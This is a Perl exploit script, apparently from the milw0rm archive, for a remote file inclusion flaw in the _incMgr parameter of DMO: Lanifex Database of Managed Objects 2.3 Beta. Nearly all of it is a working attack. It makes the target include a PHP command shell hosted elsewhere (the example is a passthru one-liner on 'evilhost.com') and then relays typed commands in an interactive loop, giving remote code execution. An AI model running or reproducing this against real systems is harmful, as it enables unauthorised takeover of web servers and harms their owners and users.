#!/usr/bin/perl

use LWP::UserAgent;

#/*
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- DMO: Lanifex Database of Managed Objects &lt;= 2.3 Beta (_incMgr) Remote File Include Vulnerability
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- [Script name: DMO: Lanifex Database of Managed Objects v. 2.3 Beta
#- [Script site: http://sourceforge.net/projects/dmo/
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-          Find by: Kacper (a.k.a Rahim)
#+		  
#-          Contact: kacper1964@yahoo.pl   
#-                        or   
#-           http://www.rahim.webd.pl/
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- Special Greetz: DragonHeart ;-)
#- Ema: Leito, Leon, Adam, DeathSpeed, Drzewko, pepi, mivus ;]
#-
#!@ Przyjazni nie da sie zamienic na marne korzysci @!
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-            Z Dedykacja dla osoby,
#-         bez ktorej nie mogl bym zyc...
#-           K.C:* J.M (a.k.a Magaja)
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# usage:
# perl exploit.pl &lt;DMO Locaction&gt; &lt;shell location&gt; &lt;shell cmd&gt;
#
# perl exploit.pl http://site.com/[DMO_Path]/ http://site.com/cmd.txt cmd
#
# cmd shell example: &lt;?passthru($_GET[cmd]);?&gt;
#
# cmd shell variable: ($_GET[cmd]);
#


$sciezka = $ARGV[0];

$sciezkacmd = $ARGV[1];

$komenda = $ARGV[2];

if($sciezka!~/http:\/\// || $sciezkacmd!~/http:\/\// || !$komenda){usage()}

head();

while()
{
print &quot;[shell] \$&quot;;
while(&lt;STDIN&gt;)
{
$cmd=$_;
chomp($cmd);

$xpl = LWP::UserAgent-&gt;new() or die;

$req = HTTP::Request-&gt;new(GET=&gt;$sciezka.&#039;LFXlib/access_manager.php?_incMgr=&#039;.$sciezkacmd.&#039;?&amp;&#039;.$komenda.&#039;=&#039;.$cmd)or die &quot;\nCouldNot connect\n&quot;;
$res = $xpl-&gt;request($req);

$return = $res-&gt;content;
$return =~ tr/[\n]/[&amp;#234;]/;

if (!$cmd) {print &quot;\nEnter a Command\n\n&quot;; $return =&quot;&quot;;}

elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot executea blank command in &lt;b&gt;/)

{print &quot;\nCould Not Connect to cmd Host or Invalid Command Variable\n&quot;;exit}

elsif ($return =~/^&lt;br.\/&gt;.&lt;b&gt;Warning/) {print &quot;\nInvalid Command\n\n&quot;}

if($return =~ /(.+)&lt;br.\/&gt;.&lt;b&gt;Warning.(.+)&lt;br.\/&gt;.&lt;b&gt;Warning/)
{

$finreturn = $1;
$finreturn=~ tr/[&amp;#234;]/[\n]/;
print &quot;\r\n$finreturn\n\r&quot;;
last;


}
else {print &quot;[shell] \$&quot;;}}}last;

sub head()
{
print &quot;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n&quot;;
print &quot;+          - - [DEVIL TEAM THE BEST POLISH TEAM] - -         +\n&quot;;
print &quot;+ DMO &lt;= 2.3 Beta (_incMgr) Remote File Include Vulnerability+\n&quot;;
print &quot;+                http://www.rahim.webd.pl/                   +\n&quot;;
print &quot;+                Find by: Kacper (a.k.a Rahim)               +\n&quot;;
print &quot;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n&quot;;
}
sub usage()
{
head();
print &quot; Usage: perl exploit.pl &lt;DMO Locaction&gt; &lt;shell location&gt; &lt;shell cmd&gt;\r\n\n&quot;;
print &quot; &lt;DMO Locaction&gt; - Full path to DMO ex: http://www.site.com/DMO/\r\n&quot;;
print &quot; &lt;shell location&gt; - Path to cmd Shell e.g http://www.evilhost.com/cmd.txt\r\n&quot;;
print &quot; &lt;shell cmd&gt; - Command variable used in php shell \r\n&quot;;
print &quot; ============================================================================\r\n&quot;;
print &quot;                         Find by: Kacper (a.k.a Rahim)                       \r\n&quot;;
print &quot;                           http://www.rahim.webd.pl/                         \r\n&quot;;
print &quot;                          Special Greetz: DragonHeart ;-)                    \r\n&quot;;
print &quot; ============================================================================\r\n&quot;;

exit();
}

#Pozdrawiam wszystkich ;-)

# milw0rm.com [2006-08-30]
